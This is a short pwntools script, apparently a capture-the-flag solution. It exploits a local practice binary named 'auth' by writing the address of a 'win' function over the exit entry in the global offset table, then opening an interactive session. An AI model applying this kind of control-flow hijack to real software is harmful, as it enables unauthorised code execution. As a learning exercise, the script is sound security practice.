from pwn import *

p=process("./auth")
e=ELF("./auth")

p.sendline(hex(e.got['exit']))
puts_got = "0804A00C"
p.sendline(hex(e.symbols['win']))
p.interactive()
